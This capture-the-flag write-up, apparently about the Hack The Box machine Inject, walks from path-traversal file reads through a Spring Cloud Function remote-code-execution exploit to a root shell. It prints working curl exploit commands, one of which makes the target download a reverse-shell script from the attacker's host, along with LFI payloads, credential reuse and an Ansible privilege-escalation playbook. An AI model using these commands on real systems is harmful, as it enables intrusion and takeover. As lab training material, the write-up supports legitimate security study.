When checked the website running on port 8080 found it's providing the cloud & file share services :

By going onto the '/blogs' section I found 3 blogs written by 2 users : "admin" & " Brandon Auger"

![image](https://user-images.githubusercontent.com/87700008/224534657-01d2e78c-10d3-4e3c-987b-888afa023021.png)

Moving further when I checked the HTML source code of the page I didn't found anything special. So, I moved onto the directory list & subdomain enumeration.

In subdomain or VHOST enumeration & I didn't found anything :

![image](https://user-images.githubusercontent.com/87700008/224540315-9024f38b-f8a5-4641-8cad-c6d61dccf4da.png)

In directory list I found some directories :

![image](https://user-images.githubusercontent.com/87700008/224540364-b533d963-7d2f-4667-a516-20b71d806188.png)

I started checking with 'release_notes' but on this page there are only release notifications :

![image](https://user-images.githubusercontent.com/87700008/224542030-b05e0ee7-d985-42e5-aad6-c3ae5723ffb2.png)

Then I tried to register on the page but the page is under the construction :

Then I moved onto the '/uploads' section & after uploading the php reverse shell I observed that I can only upload image files. So, I uploaded on the file with '.jpg' extension & found that it's leading me to another page where I can see my uploaded image.

      /show_image?img=php-reverse-shell.php.jpg
      
 ![image](https://user-images.githubusercontent.com/87700008/224542405-281c94f6-e0d0-4a33-91df-510489a706b9.png)

I tried the '/show_image?img=' path with some LFI payloads & started checking with '/etc/passwd'. After performing multiple payloads I entered the below payload & observed 200 response.

    &.//&.//&.//&.//&.//etc/group
    
![image](https://user-images.githubusercontent.com/87700008/224542604-ab7a9e08-3a79-4bba-82f9-3e363a24ec51.png)

I am confirmed here that this path is vulnerable to LFI but I still not able to read the /etc/passwd content, so again I tried some LFI payloads & after some times I got success with this payload :

    ../../../../../../../../../../../../../../../../etc/passwd

I found 2 users in the above list 'frank' & 'phil'

With further enumeration I found below results :

Enumerating further into below mentioned directory I found an xml config file :

    ../../../../../../../../../../../../../../../../var/www/WebApp/pom.xml
    
In this config file I found a framework running with "Spring cloud function". Which is vulnerable to RCE found in this [blog](https://security.snyk.io/vuln/SNYK-JAVA-ORGSPRINGFRAMEWORKCLOUD-2436645) by Snyk
    
![image](https://user-images.githubusercontent.com/87700008/224727399-f526600f-191f-4142-82ef-acba6a648a56.png)


I found this [exploit](https://github.com/darryk10/CVE-2022-22963) on GitHub for the spring framework module.

Following the exploit I executed the below curl command to check wether I am able to create any file in the 'tmp' directory or not.

    curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/expl0it")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'

![image](https://user-images.githubusercontent.com/87700008/224731422-f9dbf038-60a4-476b-b74c-3830b819a528.png)

I observed that my 'expl0it' folder got created in the temp directory, now It's time for the shell.

### Initial access:

To get the reverse shell I created a bash file to received reverse shell in my machine with below code :

![image](https://user-images.githubusercontent.com/87700008/224747729-b9ba917c-4be2-49e6-b1ce-4af09fcfc977.png)

I started python3 http server & uploaded the bash file from my using using this command :

    curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"curl http://10.10.14.103/hell.sh -o /tmp/hell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
    
And then I executed the uploaded bash script using this command & got the reverse shell : (pwn3d!ðŸ™‚)

    curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"bash /tmp/hell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'

In Frank's home directory I found a directory called '.m2' so I thought to give it a look & in the folder I found a settings.xml file which contains Phil's password :

![image](https://user-images.githubusercontent.com/87700008/224754633-7fbf629c-c60e-4624-b4de-e78adebc97b2.png)

![image](https://user-images.githubusercontent.com/87700008/224754874-d31ef599-37f2-4f96-96d3-7328ab8e31c0.png)

I tried to login via SSH to Phil account with the gathered credential but I SSH was unsuccessfull. ðŸ˜•
But then I tried to directly switch user 'su phil' & this time I used the same password and I switched successfully. (pwn3d! ðŸ™‚)

Now, that I have the Phil access I got the user flag.

## Priv Esc :

For Privilege escalation I used 'linpeas' script but didn't got any hint, I tried manual enumeratyion as well but no luck there as well.

Then I uploaded pspy binary to the Inject box & started checking the root process. I found that there is a process running called 'ansible-playbook' with root privileges :

![image](https://user-images.githubusercontent.com/87700008/224776993-8622cded-e74f-4fdf-ad86-c7b1a865c672.png)

I found an exploit here in [GTFO bins](https://gtfobins.github.io/gtfobins/ansible-playbook/) for the 'ansible-playbook'

This tool is found to automate all "*yml" files in the /task directory in which the playbook_1.yml file is discovered. This file is a fragment of an Ansible playbook file, which is a YAML file that contains a series of tasks that must be executed by Ansible on a set of hosts or on a specific host.

When checked the "/opt/automation/tasks" directory I found that apart from "root", "staff" user is also having the access for writing into the task directory.
And Phil is in the Staff user group :

So, We can write into the 'task' directory & 'ansible-playbook' will run the file if the extension is ending with '.yml' hence I created a file inside the task directory named 'pe.yml' with the below code :

```
- hosts:  localhost
  tasks:
    - name: become root
      command: chmod u+s /bin/bash
      become: true
```

And after waiting for almost 1 minute I executed 'bash -p' & got the root access. (pwn3d!ðŸ™‚)
